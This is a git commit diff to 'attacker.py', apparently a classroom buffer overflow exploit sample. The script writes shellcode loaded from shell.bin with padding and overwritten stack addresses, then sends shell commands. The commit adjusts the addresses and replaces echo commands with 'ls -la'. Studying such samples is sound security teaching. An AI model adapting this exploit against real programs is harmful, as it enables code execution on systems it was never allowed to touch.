0f45ff05c348bbbf6bd3c92e5f017881caf29e39
Roberto Guanciale <guancio@gmail.com>
2018-10-19 09:27:22 +0200

    ??

--- buffer/sample6/attacker.py
+++ buffer/sample6/attacker.py
@@ -8,18 +8,18 @@ x = open("shell.bin").read()
 sys.stdout.write(x)
 sys.stdout.write("1"*(128 - len(x)))
 
-sys.stdout.write(struct.pack("@I", 0xffffdd10))
+sys.stdout.write(struct.pack("@I", 0xffffdd50))
 sys.stdout.write(struct.pack("@I", 0x7fff))
 
-sys.stdout.write(struct.pack("@I", 0xffffdc60))
+sys.stdout.write(struct.pack("@I", 0xffffdca0))
 sys.stdout.write(struct.pack("@I", 0x7fff))
 
 
 sys.stdout.write("\n")
 while True:
-    #sys.stdout.write("ls -la\n")
-    sys.stdout.write("echo hello\n")
-    sys.stdout.write("echo hello >> hello.txt\n")
+    sys.stdout.write("ls -la\n")
+    #sys.stdout.write("echo hello\n")
+    #sys.stdout.write("echo hello >> hello.txt\n")
 
 
 
